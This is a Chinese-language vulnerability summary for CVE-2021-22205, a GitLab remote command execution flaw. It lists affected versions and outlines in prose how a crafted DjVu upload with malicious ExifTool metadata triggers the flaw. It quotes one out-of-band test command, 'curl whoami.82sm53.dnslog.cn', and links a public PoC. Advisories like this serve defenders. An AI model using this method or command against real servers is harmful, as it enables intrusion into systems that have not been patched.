## CVE-2021-22205-GitLab-远程命令执行

**漏洞编号:** CVE-2021-22205

**漏洞类型:** 远程命令执行

**影响应用:** GitLab

**危害等级:** 高危，可能导致完全控制服务器

**影响版本:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**利用条件:** 目标GitLab实例可从网络访问，且未打补丁

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-22205 存在于 GitLab CE/EE 中，影响从 11.9 开始的所有版本。GitLab 没有正确验证传递给文件解析器的图像文件，导致远程命令执行。攻击者可以通过上传特制的图像文件，其中包含恶意 ExifTool 元数据，执行任意命令。

**漏洞利用方式:**
1.  攻击者首先访问GitLab实例的登录页面 `/users/sign_in`，获取 CSRF token。 
2.  然后，攻击者构造一个包含恶意 ExifTool 元数据的特制图像文件（DJVU 格式）。该文件中的 metadata 字段包含要执行的命令，例如 `curl whoami.82sm53.dnslog.cn` 或其他恶意指令。
3.  攻击者使用 multipart/form-data 将此特制图像文件上传到 `/uploads/user` 端点。请求头中包含之前获取的 CSRF token。
4.  GitLab 在处理上传的图像时，会调用 ExifTool 来提取元数据。由于未进行充分的验证，ExifTool 会执行图像文件中嵌入的恶意命令。

**有效性:**
提供的PoC代码利用了CVE-2021-22205漏洞，通过上传特制的DJVU图像，其中包含了恶意的ExifTool元数据，可以实现远程命令执行。PoC代码首先获取CSRF Token，然后构造包含payload的multipart/form-data请求，发送到`/uploads/user`端点。如果目标存在漏洞且未打补丁，PoC会成功执行命令。

**投毒风险:**
提供的PoC代码主要功能是利用漏洞执行命令。经过分析，代码中没有发现明显的恶意逻辑或后门。 风险较低， 但是并不能排除作者在代码中隐藏了不易察觉的投毒代码。例如通过网络加载恶意代码等。所以这里评估的投毒风险为1%。

**项目地址:** [ccordeiro/CVE-2021-22205](https://github.com/ccordeiro/CVE-2021-22205)

**漏洞详情:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)